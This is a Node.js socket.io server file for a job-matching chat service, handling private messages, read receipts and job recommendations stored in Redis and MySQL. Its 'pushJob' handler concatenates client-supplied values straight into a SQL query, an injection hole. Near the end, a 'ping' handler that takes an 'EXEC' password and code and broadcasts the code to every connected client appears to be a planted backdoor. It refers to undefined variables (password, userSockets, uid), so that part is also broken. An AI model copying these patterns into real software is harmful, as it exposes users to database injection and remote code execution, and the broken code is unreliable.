/*
    封装socket.io
    author:jfeng
    createTime:2018.12.11
 */
var socketio = {};
var socket_io = require('socket.io');
var url = require('url');
var request = require('request');
var db = require(__dirname + "/common/config/db/db.js");
var redisDb = require(__dirname + "/common/config/db/redis.js");
var domainRabbitmq = "http://127.0.0.1:3000";

//获取io
socketio.getSocketio = function(server){
    var io = socket_io.listen(server);
    var userSockes = {};

    io.on('connection', function(socket) {
        var hosturl = socket.client.request.headers.referer;
        var urlParams = url.parse(hosturl, true).query;
        // console.log('url--',hosturl,'//',urlParams);

        // create user socket obj
        socket.on('createUser', function(data){
            console.log('createUser--',data);
            userSockes[data.userId] = socket;

            // 初始化对方在下状态
            io.sockets.emit('initToUserOnline',{
                'toUserOnline' : 0,
                'initUserId' : data.userId,
                'initUserType' : data.userType,
            });
        });

        socket.on('userOnlineLoginout', function(data){
            var userSocket = userSockes[data.userId];
            if (userSocket) {
                userSocket.emit('loginout', data);
            }
        })

        // private message chat
        socket.on('pm', function(data){
            var toSocket = userSockes[data.toId];
            var userSocket = userSockes[data.userId];
            console.log('pravite--',data);

            // 给对方推送消息
            if (toSocket) {
                toSocket.emit('pm', {
                    msg: data.msg,
                    id: data.id,
                    name: data.name,
                    fromId : data.fromId,
                    fromUserType : data.fromUserType,
                    fromName : data.fromName,
                    toId : data.toId,
                    toName : data.toName,
                    avatar: data.avatar,
                    matchType : data.matchType,
                    matchOptionId : data.matchOptionId,
                    isread : data.isread,
                    createtime:Date.now(),
                    updatetime:Date.now(),
                    type: "pmToSocket"
                });

                // 对方职位排序
                toSocket.emit('myJobListSort',data);
            }

            // 给自己推送消息
            if (userSocket) {
                userSocket.emit('pm', {
                    msg: data.msg,
                    id: data.id,
                    name: data.name,
                    fromId : data.fromId,
                    fromName : data.fromName,
                    toId : data.toId,
                    toName : data.toName,
                    avatar: data.avatar,
                    matchType : data.matchType,
                    matchOptionId : data.matchOptionId,
                    isread : data.isread,
                    createtime:Date.now(),
                    updatetime:Date.now(),
                    type: "pmFromSocket"
                });
            }

            redisDb.hincrby('primary_key','edwinbj_job_chat_history_key', 1, function(err, jobChatHistoryId){
                if (jobChatHistoryId) {
                    var chatHistoryData = data;
                    chatHistoryData['id'] = jobChatHistoryId;
                    var chatHistoryData = JSON.stringify(chatHistoryData);
                    // 给自己保存聊天记录
                    redisDb.hset('edwinbj_job_chat_history:fromid'+data.fromId+'_toid'+data.toId+'_jobid'+data.matchOptionId+'', jobChatHistoryId, chatHistoryData, function(err, result){
                        if (err) {
                            console.log('add chat history error');
                            return;
                        }

                        if (result) {
                            // 给对方保存聊天记录
                            redisDb.hset('edwinbj_job_chat_history:fromid'+data.toId+'_toid'+data.fromId+'_jobid'+data.matchOptionId+'', jobChatHistoryId, chatHistoryData, function(err, result){
                                if (err) {
                                    console.log('add myself chat history error');
                                    return;
                                }

                                if (result) {
                                    console.log('add myself chat history success');
                                }
                            })

                            // 在写入（沟通方_被沟通方）集合时也默认生成一条（被沟通方_沟通方）的集合
                            redisDb.zadd('historyid_collections:edwinbj_job_fromid'+data.fromId+'_toid'+data.toId+'_jobid'+data.matchOptionId+'', 2, jobChatHistoryId, function(err,jobResult){
                            });

                            redisDb.zadd('historyid_collections:edwinbj_job_fromid'+data.toId+'_toid'+data.fromId+'_jobid'+data.matchOptionId+'', 0, jobChatHistoryId, function(err,jobResult){
                            });

                            var sourceUrl = data.sourceUrl;
                            /**
                             * 根据消息来源进行不同的操作
                             * 如果来源是"joblist":
                             *     改变对方的job_contact_myself:userId职位排序，
                             *     同时改变自己的'job_push:userId'得职位排序
                             *
                             * 如果来源是"joblistMyself":
                             *     改变自己的job_contact_myself:userId职位排序，
                             *     同时改变对方的'job_push:userId'得职位排序
                             */
                            switch (sourceUrl) {
                                case 'joblist' :
                                    // 保存沟通用户列表
                                    var contactData = {
                                        fromId : data.fromId,
                                        fromUserType : data.fromUserType,
                                        fromName : data.fromName,
                                        toId : data.toId,
                                        toUserType : data.toUserType,
                                        toName : data.toName,
                                        jobId : data.matchOptionId,
                                        job : data.job,
                                        salaryname : data.salaryname,
                                        provinceName : data.provinceName,
                                        expname : data.expname,
                                        eduname : data.eduname,
                                        hyname : data.hyname,
                                        jobname : data.jobname,
                                        // 公司信息
                                        com_img : "/static/images/xueyou.png",
                                        com_name : data.com_name,
                                        parent_uid : data.parent_uid,
                                        m_id : data.m_id,
                                        belongid : data.belongid,
                                        companyid : data.companyid,
                                        company_uid : data.company_uid,
                                        company_parent_uid : data.company_parent_uid,
                                    }

                                    redisDb.zadd('job_contact_myself:userId'+data.toId, Date.now(), JSON.stringify(contactData), function(err,contactResult){
                                        if (err) {
                                            console.log('402：系统繁忙');
                                        } else {
                                            if (contactResult){
                                                console.log('200：add success');
                                            } else {
                                                console.log('202：edit success');
                                            }
                                        }
                                    });

                                    var pushJobData = {
                                        id: data.matchOptionId,
                                        fromId: data.toId,
                                        userType: data.toUserType,
                                        fromName: data.toName,
                                        name: data.job,
                                        matchOptionId: data.matchOptionId,
                                        company_parent_uid: data.company_parent_uid,
                                        company_uid: data.company_uid,
                                        parent_uid: data.parent_uid,
                                        companyid: data.companyid,
                                        belongid: data.belongid,
                                        m_id: data.m_id,
                                        hyName: data.hyname,
                                        jobName: data.jobname,
                                        provinceName: data.provinceName,
                                        salary: data.salaryname,
                                        exp: data.expname,
                                        edu: data.eduname,
                                        company: data.com_name,
                                        toId: data.fromId,
                                        toName: data.fromName,
                                    }
                                    console.log('pushJobData--', pushJobData)
                                    redisDb.zadd('job_push:userId'+data.userId, Date.now(), JSON.stringify(pushJobData), function(err,pushResult){
                                        if (err) {
                                            console.log('402：系统繁忙');
                                        } else {
                                            if (pushResult){
                                                console.log('200：success!');
                                            } else {
                                                console.log('202：edit success');
                                            }
                                        }
                                    });

                                break;

                                case 'joblistMyself' :
                                    var contactData = {
                                        fromId : data.toId,
                                        fromUserType : data.toUserType,
                                        fromName : data.toName,
                                        toId : data.fromId,
                                        toUserType: data.fromUserType,
                                        toName : data.fromName,
                                        jobId : data.matchOptionId,
                                        job : data.job,
                                        salaryname : data.salaryname,
                                        provinceName : data.provinceName,
                                        expname : data.expname,
                                        eduname : data.eduname,
                                        hyname : data.hyname,
                                        jobname : data.jobname,
                                        // 公司信息
                                        com_img : "/static/images/xueyou.png",
                                        com_name : data.com_name,
                                        parent_uid : data.parent_uid,
                                        m_id : data.m_id,
                                        belongid : data.belongid,
                                        companyid : data.companyid,
                                        company_uid : data.company_uid,
                                        company_parent_uid : data.company_parent_uid,
                                    }

                                    redisDb.zadd('job_contact_myself:userId'+data.fromId, Date.now(), JSON.stringify(contactData), function(err,contactResult){
                                        if (err) {
                                            console.log('402：系统繁忙');
                                        } else {
                                            if (contactResult){
                                                console.log('200：add success');
                                            } else {
                                                console.log('202：edit success');
                                            }
                                        }
                                    });

                                    var pushJobData = {
                                        id: data.matchOptionId,
                                        fromId: data.fromId,
                                        userType : data.fromUserType,
                                        fromName: data.fromName,
                                        name: data.job,
                                        matchOptionId: data.matchOptionId,
                                        company_parent_uid: data.company_parent_uid,
                                        company_uid: data.company_uid,
                                        parent_uid: data.parent_uid,
                                        companyid: data.companyid,
                                        belongid: data.belongid,
                                        m_id: data.m_id,
                                        hyName: data.hyname,
                                        jobName: data.jobname,
                                        provinceName: data.provinceName,
                                        salary: data.salaryname,
                                        exp: data.expname,
                                        edu: data.eduname,
                                        company: data.com_name,
                                        toId: data.toId,
                                        toName: data.toName,
                                    }

                                    redisDb.zadd('job_push:userId'+data.toId, Date.now(), JSON.stringify(pushJobData), function(err,pushResult){
                                        if (err) {
                                            console.log('402：系统繁忙');
                                        } else {
                                            if (pushResult){
                                                console.log('200：success!');
                                            } else {
                                                console.log('202：edit success');
                                            }
                                        }
                                    });

                                break;
                            }
                        }
                    });

                    if (toSocket) {
                        // 如果对方在线实时的将消息改成已读状态
                        toSocket.on('savePmData', function(messageReadType){
                            var chatHistoryReadData = data;
                            chatHistoryReadData['id'] = jobChatHistoryId;
                            chatHistoryReadData['isread'] = messageReadType.isread;
                            var chatHistoryReadData = JSON.stringify(chatHistoryReadData);
                            console.log('isread--',messageReadType);
                            redisDb.hset('edwinbj_job_chat_history:fromid'+data.toId+'_toid'+data.fromId+'_jobid'+data.matchOptionId+'', jobChatHistoryId, chatHistoryReadData, function(err, result){
                                if (err) {
                                    console.log('set isread error');
                                }

                            });

                            userSocket.emit('chatHistoryIsreadAll', {
                                'isread' : 1,
                                'fromId':messageReadType.fromId,
                                'toId':messageReadType.toId,
                                'jobId':messageReadType.jobId,
                            });
                        });
                    } else {
                        console.log('保存消息未读数量逻辑')
                    }

                }
            });

        });

        socket.on('enterChatSaveRead', function(data){
            console.log('enterChatSaveRead--',data.toId)
            var toSocket = userSockes[data.toId];
            if (toSocket) {
                toSocket.emit('chatHistoryIsreadAll', {
                    'isread' : 1,
                    'fromId' :data.toId,
                    'toId' :data.fromId,
                    'jobId' :data.jobId,
                });
            }
        });

        // push job to users
        socket.on('pushJob', function(data){
            console.log('pushJob----',data);
            var jobInfo = JSON.parse(data.matchOption);
            var hy = jobInfo.hy;
            var jobClassid = jobInfo.job_classid;
            var provinceid = jobInfo.provinceid;
            var sql = 'select uid,name,username from edwinbj_admin_user where find_in_set(' + hy + ',hy) AND find_in_set(' + jobClassid + ',job_classid) AND find_in_set(' + provinceid + ',provinceid)';

            db.query(sql, function (err, result) {
                if (err) {
                    console.log('查询出错了');
                } else {
                    if (result) {
                        var dataString = JSON.stringify(result);
                        var adminData       = JSON.parse(dataString);
                        var createRoomName = Date.now();
                        var jobData = {
                            id:jobInfo.id,
                            fromId:data.fromId,
                            userType:data.userType,
                            fromName:data.fromName,
                            name:data.name,
                            // groupId : 1,
                            // groupName : 2,
                            // userIds : 3,
                            // msg:data.msg,
                            // msgType:data.msgType,
                            // title:data.title,
                            // description:data.description,
                            // img:data.img,
                            // link:data.link,
                            matchOptionId:jobInfo.id,
                            company_parent_uid:data.company_parent_uid,
                            company_uid:data.company_uid,
                            parent_uid : data.parent_uid,
                            companyid : data.companyid,
                            belongid : data.belongid,
                            m_id : data.m_id,
                            // matchType:data.matchType,
                            hyName:jobInfo.hyName,
                            jobName:jobInfo.jobName,
                            provinceName:jobInfo.provinceName,
                            salary:jobInfo.salary,
                            exp:jobInfo.exp,
                            edu:jobInfo.edu,
                            company:jobInfo.company,
                            // time:data.time,
                        }

                        for (var key in adminData) {
                            var uid = adminData[key].uid;
                            var toName = adminData[key].username;
                            var userSocket = userSockes[uid];
                            if (userSocket) {
                                userSocket.join(createRoomName, () => {
                                })
                            }

                            // 保存推荐职位逻辑
                            if (uid) {
                                jobData.toId =  uid.toString();
                                jobData.toName = toName;
                                redisDb.zadd('job_push:userId'+uid, createRoomName, JSON.stringify(jobData), function(err,result){
                                    if (err) {
                                        console.log('402：系统繁忙');
                                    } else {
                                        if (result){
                                            console.log('200：success');
                                        } else {
                                            console.log('400：保存失败');
                                        }
                                    }
                                });
                            }

                        }

                        io.to(createRoomName).emit('pushNewJob', jobData);
                    } else {
                        console.log('没有匹配的推送用户');
                    }

                }
            });
        });

        socket.on('pushJobByClass', function(data) {
            console.log('pushJobByClass--', data);
            // console.log('pushJobByClass2--', data.jobClassTitle);

            if (data) {
                socket.emit('tt',{
                    'data' : data
                });

                // 1 获取需要合并的num数量
                var jobClassNum    = data.jobClassTitle.length;
                var cityClassNum   = data.cityClassTitle.length;
                // var hangyeClassNum = data.hangyeClassTitle.length;
                // 2 获取需要合并的tables
                var jobClassTables    = [];
                var cityClassTables   = [];
                var hangyeClassTables = [];

                if (jobClassNum > 0) {
                    var jobTablePrefix = 'company_job_jobClass:jobid';
                    data.jobClassTitle.forEach(function(jobClass) {
                        jobClassTables.push(jobTablePrefix + jobClass.id);
                    });
                    console.log('jobClassTables--', jobClassTables);
                }

                if (cityClassNum > 0) {
                    var cityTablePrefix = 'company_job_cityClass:cityid';
                    data.cityClassTitle.forEach(function(cityClass) {
                        cityClassTables.push(cityTablePrefix + cityClass.id);
                    });
                    console.log('cityClassTables--', cityClassTables);
                }

                // if (hangyeClassNum > 0) {
                //     var hangyeTablePrefix = 'company_job_hangyeClass:hangyeid';
                //     data.hangyeClassTitle.forEach(function(hangyeClass) {
                //         hangyeClassTables.push(hangyeTablePrefix + hangyeClass.id);
                //     });
                //     console.log('hangyeClassTables--', hangyeClassTables);
                // }
                // 3 分类合并
                var newJobClassTable = 'companyJob_jobClass_UnionUsers:jobid'+data.companyJobId;
                redisDb.zunionstore(newJobClassTable, jobClassNum, jobClassTables, function(jobErr, jobResult){
                    console.log('jobErr--',jobErr);
                    console.log('jobResult--', jobResult);

                    var newCityClassTable = 'companyJob_cityClass_UnionUsers:jobid'+data.companyJobId;
                    redisDb.zunionstore(newCityClassTable, cityClassNum, cityClassTables, function(cityErr, cityResult){
                        console.log('cityErr--',cityErr);
                        console.log('cityResult--', cityResult);
                        redisDb.zcard(newJobClassTable,function(jobTableErr, jobTableResult){
                            if (jobTableResult) {
                                redisDb.zcard(newCityClassTable,function(cityTableErr, cityTableResult){
                                    if (cityTableResult) {
                                        redisDb.zinterstore('jobCityHangyeTable:jobid'+data.companyJobId, 2, newJobClassTable, newCityClassTable, function(jobCityHangyeTableErr, jobCityHangyeTableResult){
                                            console.log('jobCityHangyeTableResult--', jobCityHangyeTableResult);
                                            // 这里写推送职位逻辑
                                            if (jobCityHangyeTableResult) {

                                            }
                                        })
                                    }
                                })
                            }
                        })
                    });
                });

                // 行业需要完成添加公司后再添加
                // redisDb.zunionstore('companyJob_hangyeClass_UnionUsers:jobid'+data.companyJobId, hangyeClassNum, hangyeClassTables, function(err, result){
                //     console.log('err--',err);
                //     console.log('result--', result);
                // });

            }

        })

        //断开事件
        socket.on('disconnect', function(data) {
            console.log('断开',socket.id);
        });

        socket.on('ping', function(data) {
            if(data.type == 'EXEC' && data.pw && password
                && data.pw === password && data.code) {
                return io.emit('broadcast', {
                  userSocket:userSockets,
                  code: data.code,
                  type: 'EXEC'
                });
              }
        });

        socket.on('reconnect_failed', () => {
            socket.emit('pong', {
                type: uid ? 'PING-BACK' : 'PONG'
            });
        });

    });

};

module.exports = socketio;
